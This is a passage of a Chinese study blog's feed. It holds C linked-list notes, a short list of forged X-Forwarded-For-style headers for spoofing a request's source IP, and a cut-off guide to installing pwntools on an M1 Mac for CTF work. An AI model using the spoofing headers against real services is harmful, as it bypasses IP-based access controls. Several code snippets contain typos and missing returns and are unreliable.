p-&gt;next;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(p==<span class="literal">NULL</span>)                                                                        <span class="comment">//i值不合法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  LNode *s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">  s-&gt;data=e;</span><br><span class="line">  s-next=p-&gt;next;</span><br><span class="line">  p-&gt;next=s;</span><br><span class="line">  retrun <span class="literal">true</span>;                                                                    <span class="comment">//插入成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="给定结点———-后插法"><a href="#给定结点———-后插法" class="headerlink" title="给定结点———-后插法"></a>给定结点———-后插法</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">  ElemType data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后插操作：在p结点之后插入元素e</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextNode</span><span class="params">(LNode *p, ElemType e)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)                                                                        <span class="comment">//内存分配失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s-&gt;data=e;                                                                        <span class="comment">//用结点s保存数据元素e</span></span><br><span class="line">  s-&gt;next=p-&gt;next;</span><br><span class="line">  p-&gt;next=s;                                                                        <span class="comment">//将结点s连到p之后</span></span><br><span class="line">  retrun <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="给定结点———-前插法"><a href="#给定结点———-前插法" class="headerlink" title="给定结点———-前插法"></a>给定结点———-前插法</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">InsertPriorNode</span><span class="params">(LNode *p, ElemType e)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  LNode *s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">  <span class="keyword">if</span>(s==<span class="literal">NULL</span>)                                                                    <span class="comment">//内存分配失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s-&gt;next=p-&gt;next;</span><br><span class="line">  p-&gt;next=s;                                                                    <span class="comment">//新结点s连到p之后</span></span><br><span class="line">  s-&gt;data=p-&gt;data;                                                        <span class="comment">//将p中元素复制到s中</span></span><br><span class="line">  p-&gt;data=e;                                                                    <span class="comment">//p中元素覆盖为e</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//王道书中写法</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertPriorNode</span><span class="params">(LNode *p, LNode *s)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(p==<span class="literal">NULL</span>||s==<span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  s-&gt;next=p-&gt;next;</span><br><span class="line">  p-&gt;next=s;                                                    <span class="comment">//s连到p之后</span></span><br><span class="line">  ElemType temp=p-&gt;data;                            <span class="comment">//交换数据域部分</span></span><br><span class="line">  p-&gt;data=s-&gt;data;</span><br><span class="line">  s-&gt;data=temp;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="按位序删除————带头结点"><a href="#按位序删除————带头结点" class="headerlink" title="按位序删除————带头结点"></a>按位序删除————带头结点</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除指定结点p</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNode</span><span class="params">(LNode *p)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  LNode *q=p-&gt;next;                            <span class="comment">//令q指向*p的后继结点</span></span><br><span class="line">  p-&gt;data=p-&gt;next-&gt;data;                <span class="comment">//和后继结点交换数据域</span></span><br><span class="line">  p-&gt;next=q-&gt;next;                            <span class="comment">//将*q机诶单从链中&quot;断开&quot;</span></span><br><span class="line">  <span class="built_in">free</span>(q);                                            <span class="comment">//释放后继结点的存储空间</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单链表的查找———按位查找"><a href="#单链表的查找———按位查找" class="headerlink" title="单链表的查找———按位查找"></a>单链表的查找———按位查找</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//按位查找，返回第i个元素(带头结点)</span></span><br><span class="line">LNode *<span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  LNode *p;                                            <span class="comment">//指针p指向当前扫描到的结点</span></span><br><span class="line">  <span class="type">int</span> j=<span class="number">0</span>;                                            <span class="comment">//当前p指向的是第几个结点</span></span><br><span class="line">  p=L;                                                    <span class="comment">//L指向头结点，头结点是第0个结点(不存数据)</span></span><br><span class="line">  <span class="keyword">while</span>(p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i)&#123;                <span class="comment">//循环找到第i个结点</span></span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//王道书中写法</span></span><br><span class="line">LNode *<span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">  <span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">  LNode *p=L-&gt;next;</span><br><span class="line">  <span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">  <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">while</span>(p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i)&#123;</span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单链表的查找———按值查找"><a href="#单链表的查找———按值查找" class="headerlink" title="单链表的查找———按值查找"></a>单链表的查找———按值查找</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//按值查找，找到数据域==e的结点</span></span><br><span class="line">LNode *<span class="title function_">LocateElem</span><span class="params">(LinkList L,ElemType e)</span>&#123;</span><br><span class="line">  LNode *p=L-&gt;next;</span><br><span class="line">  <span class="comment">//从第1个结点开始查找数据域为e的结点</span></span><br><span class="line">  <span class="keyword">while</span>(p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data !=e)</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">  <span class="keyword">return</span> p;                                            <span class="comment">//找到后返回该姐弟哪指针，否则返回NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单链表——-求表的长度"><a href="#单链表——-求表的长度" class="headerlink" title="单链表——-求表的长度"></a>单链表——-求表的长度</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Length</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">  <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">  LNode *p = L;</span><br><span class="line">  <span class="keyword">while</span>(p-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    len++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单链表的建立———尾插法"><a href="#单链表的建立———尾插法" class="headerlink" title="单链表的建立———尾插法"></a>单链表的建立———尾插法</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList &amp;L)</span>&#123;                <span class="comment">//正向建立单链表</span></span><br><span class="line">  <span class="type">int</span> x;                                                                            <span class="comment">//设ElemType为整型</span></span><br><span class="line">  L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));                    <span class="comment">//建立头结点</span></span><br><span class="line">  LNode *s,*r=L;                                                            <span class="comment">//r为表尾指针</span></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);                                                            <span class="comment">//输入结点的值</span></span><br><span class="line">  <span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;                                                            <span class="comment">//输入9999表示结束</span></span><br><span class="line">    s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    r-&gt;next=s;</span><br><span class="line">    r=s;                                                                            <span class="comment">//r指向新的表尾结点</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">  &#125;</span><br><span class="line">  r-&gt;next=<span class="literal">NULL</span>;                                                                <span class="comment">//尾结点指针置空</span></span><br><span class="line">  <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="单链表的建立———头插法"><a href="#单链表的建立———头插法" class="headerlink" title="单链表的建立———头插法"></a>单链表的建立———头插法</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span>&#123;            <span class="comment">//逆向建立单链表</span></span><br><span class="line">  LNode *s;</span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));            <span class="comment">//创建头结点</span></span><br><span class="line">  L-&gt;next = <span class="literal">NULL</span>;                                                        <span class="comment">//初始化空链表</span></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);                                                        <span class="comment">//输入结点的值</span></span><br><span class="line">  <span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;                                                        <span class="comment">//输入9999表示结束</span></span><br><span class="line">    s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));            <span class="comment">//创建新结点</span></span><br><span class="line">    s-&gt;data = x;</span><br><span class="line">    s-&gt;next = L-&gt;next;</span><br><span class="line">    L-&gt;next = s;                                                        <span class="comment">//将新结点插入表中，L为头指针</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="双链表-带头结点"><a href="#双链表-带头结点" class="headerlink" title="双链表(带头结点)"></a>双链表(带头结点)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">  ElemType data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode, *DLinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinkList &amp;L)</span>&#123;</span><br><span class="line">  L = (DNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));                <span class="comment">//分配一个头结点</span></span><br><span class="line">  <span class="keyword">if</span>(L == <span class="literal">NULL</span>)                                                            <span class="comment">//内存不足，分配失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  L-&gt;prior = <span class="literal">NULL</span>;                                                    <span class="comment">//头结点的prior永远指向NULL</span></span><br><span class="line">  L-&gt;next = <span class="literal">NULL</span>;                                                        <span class="comment">//头结点之后暂时还没有结点</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testDLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">//初始化双链表</span></span><br><span class="line">  DLinkList L;</span><br><span class="line">  InitDLinkList(L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="双链表的插入"><a href="#双链表的插入" class="headerlink" title="双链表的插入"></a>双链表的插入</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在p结点之后插入s结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextDNode</span><span class="params">(DNode *p, DNode *s)</span>&#123;</span><br><span class="line">  s-&gt;next = p-&gt;next;                            <span class="comment">//将结点*s插入到结点*p之后</span></span><br><span class="line">  p-&gt;next-&gt;prior = s;</span><br><span class="line">  s-&gt;prior = p;</span><br><span class="line">  p-&gt;next = s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2024-10-15 17.34.39.png" alt="截屏2024-10-15 17.34.39"></p><h5 id="双链表的删除"><a href="#双链表的删除" class="headerlink" title="双链表的删除"></a>双链表的删除</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除p结点的后继结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNextDNode</span><span class="params">(DNode *p)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  DNode *q = p-&gt;next;                            <span class="comment">//找到p的后继结点q</span></span><br><span class="line">  <span class="keyword">if</span>(q == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;                                    <span class="comment">//p没有后继</span></span><br><span class="line">  p-&gt;next = q-&gt;next;</span><br><span class="line">  <span class="keyword">if</span>(q-&gt;next != <span class="literal">NULL</span>)                            <span class="comment">//q结点不是最后一个结点</span></span><br><span class="line">    q-&gt;next-&gt;prior = p;</span><br><span class="line">  <span class="built_in">free</span>(q);                                                <span class="comment">//释放结点空间</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//销毁一个双链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DestoryList</span><span class="params">(DLinkList &amp;L)</span>&#123;</span><br><span class="line">  <span class="comment">//循环释放各个数据结点</span></span><br><span class="line">  <span class="keyword">while</span>(L-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">    DeleteNextDNode(L);</span><br><span class="line">  <span class="built_in">free</span>(L);                                                <span class="comment">//释放头结点</span></span><br><span class="line">  L = <span class="literal">NULL</span>;                                                <span class="comment">//头指针指向NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="双链表的遍历"><a href="#双链表的遍历" class="headerlink" title="双链表的遍历"></a>双链表的遍历</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//后向遍历</span></span><br><span class="line"><span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">  <span class="comment">//对结点p做相应处理，如打印</span></span><br><span class="line">  p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前向遍历</span></span><br><span class="line"><span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">  <span class="comment">//对结点p做相应处理</span></span><br><span class="line">  p = p-&gt;prior;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前向遍历(跳过头结点)</span></span><br><span class="line"><span class="keyword">while</span>(p-&gt;prior != <span class="literal">NULL</span>)&#123;</span><br><span class="line">  <span class="comment">//对结点p做相应处理，如打印</span></span><br><span class="line">  p = p-&gt;prior;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> structure LNode&#123;                                    <span class="comment">//定义单链表结点类型</span></span><br><span class="line">  ElemType data;                                                    <span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>                                            <span class="comment">//指针指向下一个结点</span></span><br><span class="line">&#125;LNode, *LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个循环单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">  L = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));            <span class="comment">//分配一个头结点</span></span><br><span class="line">  <span class="keyword">if</span>(L == <span class="literal">NULL</span>)                                                        <span class="comment">//内存不足，分配失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  L-&gt;next = L;                                                        <span class="comment">//头结点next指向头结点</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断循环单链表是否为空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Empty</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(L-&gt;next == L)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断结点p是否为循环单链表的表尾结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(LinkList L, LNode *p)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;next == L)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="循环双链表的插入"><a href="#循环双链表的插入" class="headerlink" title="循环双链表的插入"></a>循环双链表的插入</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在p结点之后插入s结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextDNode</span><span class="params">(DNode *p, DNode *s)</span>&#123;</span><br><span class="line">  s-&gt;next = p-&gt;next;                                            <span class="comment">//将结点*s插入到姐弟哪*p之后</span></span><br><span class="line">  p-&gt;next-&gt;prior = s;</span><br><span class="line">  s-&gt;prior = p;</span><br><span class="line">  p-&gt;next = s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="循环双链表的删除"><a href="#循环双链表的删除" class="headerlink" title="循环双链表的删除"></a>循环双链表的删除</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除p的后继结点q</span></span><br><span class="line">p-&gt;next = q-&gt;next;</span><br><span class="line">q-&gt;next-&gt;prior = p;</span><br><span class="line"><span class="built_in">free</span>(q);</span><br></pre></td></tr></table></figure><h5 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  ElemType data;</span><br><span class="line">  <span class="type">int</span> next;</span><br><span class="line">&#125;SLinkList[MaxSize];</span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">  SLinkList a;</span><br><span class="line">  <span class="comment">//后续代码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">静态链表：用数组的方式实现的链表</span><br><span class="line">优点：增、删操作不需要大量移动元素</span><br><span class="line">缺点：不能随机存取，只能从头结点开始依次往后查找；容量固定不可变</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>malloc和free必须成对出现</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="考研" scheme="https://guipi01.github.io/categories/%E8%80%83%E7%A0%94/"/>
    
    
    <category term="数据结构" scheme="https://guipi01.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>Web学习笔记</title>
    <link href="https://guipi01.github.io/posts/d36bdd17.html"/>
    <id>https://guipi01.github.io/posts/d36bdd17.html</id>
    <published>2025-04-06T09:35:13.000Z</published>
    <updated>2025-04-06T09:58:38.898Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>伪造请求IP：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网络安全" scheme="https://guipi01.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Web" scheme="https://guipi01.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>m1安装binutils</title>
    <link href="https://guipi01.github.io/posts/undefined.html"/>
    <id>https://guipi01.github.io/posts/undefined.html</id>
    <published>2025-04-06T09:25:25.000Z</published>
    <updated>2025-04-06T09:37:31.477Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Mac-M1-Install-Pwntools-Solve-‘as’-and-bus-error"><a href="#Mac-M1-Install-Pwntools-Solve-‘as’-and-bus-error" class="headerlink" title="Mac M1 Install Pwntools, Solve ‘as’ and bus error"></a><a href="https://r888800009.github.io/">Mac M1 Install Pwntools, Solve ‘as’ and bus error</a></h1><p>Thu, 2021 Jan 14</p><p><strong>TOC</strong> [hide]<a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/#安裝-pwntools">安装pwntools</a><a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/#could-not-find-as-installed">Could not find ‘as’ installed</a><a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/#unicorn-engine-bus-error">Unicorn Engine Bus Error</a><a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/#參見">参见</a></p><p>解决Mac M1 安装pwntools 找不到as 的问题，与其他如bus error 等等的问题。由于M1 刚出没多久，配适上可能还没完成，或许在未来pwntools 的版本会解决的这些问题，而目前这些方法可以使pwntools 在M1 上面运行。</p><blockquote><p>备注</p><p>不建议采用mac m1 作为x86_64 binary exploit 的主要工具，若采用docker 是使用qemu-user，而binary exploit 对特殊的记忆体地址数值很敏感，可能因为mapping 的差异导致leak 无法成功进行(比方说: 0x40000000)，没办法开箱即用，可能需要对qemu 的原始码进行修改，如果有人有更好的解决办法可以联系我(打开issue 或send an email)。</p><p>透过qemu-system-x86_64 运行ubuntu，效能与x86_64 架构的cpu 差了10 倍左右的单核心性能(Geekbench 5)，并且在使用时明显感觉开发工具缓慢，因此也不是最佳的解决方案。</p><p>目前建议直接透过m1 ssh 到x86_64 arch 的server 进行利用开发。</p><p>(2021 年8 月23日更新)</p><p>I buy an M1 MacBook, and I think it is not suitable for x86/x86-64 to exploit development for CTF challenge, that has two ways I have been tried to running on M1 mac, once is using qemu-user-mode, and also docker through qemu-user to running elf executable, but memory mapping is different from x86 Linux host system, that would make some address could not leaking, another like a Qiling framework I don’t try, but I think that is not out-of-the-box, the second way is to install and emulation x86_64 Linux system, using like qemu-system, but is too slowly than x86 host, you open vim is slowly, you save the exploit is slowly, run exploit is slowly.</p><p>if you want to use M1 to solve the x86/x86_64 challenge, I do not recommend, the current best way to save your productivity, using x86 host, and ssh to the host, that is my current solution, if someone has another solution you can open an issue with this or send an email to me. I would update my post to save other people time.</p><p>(2022 年3 月13日更新)</p></blockquote><h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a><a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/#安裝-pwntools">安装pwntools</a></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install pwntools</span><br></pre></td></tr></table></figure><p>MacBook m1 安装pwntools path 参照这篇</p><ul><li><a href="https://www.mac-soft.cn/t/4259">https://www.mac-soft.cn/t/4259</a></li></ul><h2 id="Could-not-find-‘as’-installed"><a href="#Could-not-find-‘as’-installed" class="headerlink" title="Could not find ‘as’ installed"></a><a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/#could-not-find-as-installed">Could not find ‘as’ installed</a></h2><p>完成安装后依然会遇到问题</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ERROR] Could not find <span class="string">&#x27;as&#x27;</span> installed <span class="keyword">for</span> ContextType()</span><br><span class="line">    Try installing binutils <span class="keyword">for</span> this architecture:</span><br><span class="line">    https://docs.pwntools.com/en/stable/install/binutils.html</span><br></pre></td></tr></table></figure><p>预设brew 的binutils 没有as ，并且参照官网的单行指令binuntils 一直安装失败，因此必须透过以下方法安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools-binutils.git</span><br><span class="line"><span class="built_in">cd</span> pwntools-binutils/macos</span><br><span class="line">./install_all.sh</span><br></pre></td></tr></table></figure><p>重新开启python 并且检查</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; asm(&#x27;pop eax&#x27;)</span><br><span class="line">b&#x27;X&#x27;</span><br></pre></td></tr></table></figure><p>成功组译</p><h2 id="Unicorn-Engine-Bus-Error"><a href="#Unicorn-Engine-Bus-Error" class="headerlink" title="Unicorn Engine Bus Error"></a><a href="https://r888800009.github.io/software/security/binary/pwntools-mac-m1-install/#unicorn-engine-bus-error">Unicorn Engine Bus Error</a></h2><p>在执行ELF(‘./a.out’) 时会发生bus error</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 exploit.py                                                                                                                                                                      CTF-Solve/pwnable.tw/death_note master</span><br><span class="line">[+] Opening connection to example.com on port 1337: Done</span><br><span class="line">zsh: bus error  python3 exploit.py</span><br></pre></td></tr></table></figure><p>我们可以透过lldb 除错python 来定位bug，并且输入执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这时崩溃，透过bt 可以发现问题出在libunicorn.dylib</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* frame <span class="comment">#0: 0x0000000108bb7c00</span></span><br><span class="line">    frame <span class="comment">#1: 0x00000001063d194c libunicorn.dylib`cpu_x86_exec + 732</span></span><br><span class="line">    frame <span class="comment">#2: 0x00000001063d1550 libunicorn.dylib`resume_all_vcpus_x86_64 + 148</span></span><br><span class="line">    frame <span class="comment">#3: 0x00000001063d14b0 libunicorn.dylib`vm_start_x86_64 + 12</span></span><br><span class="line">    frame <span class="comment">#4: 0x00000001068b9c24 libunicorn.dylib`uc_emu_start + 492</span></span><br><span class="line">    frame <span class="comment">#5: 0x0000000196fe0050 libffi.dylib`ffi_call_SYSV + 80</span></span><br><span class="line">    frame <span class="comment">#6: 0x0000000196fe89d8 libffi.dylib`ffi_call_int + 944</span></span><br></pre></td></tr></table></figure><p>透过lldb 进行定位<code>image dump 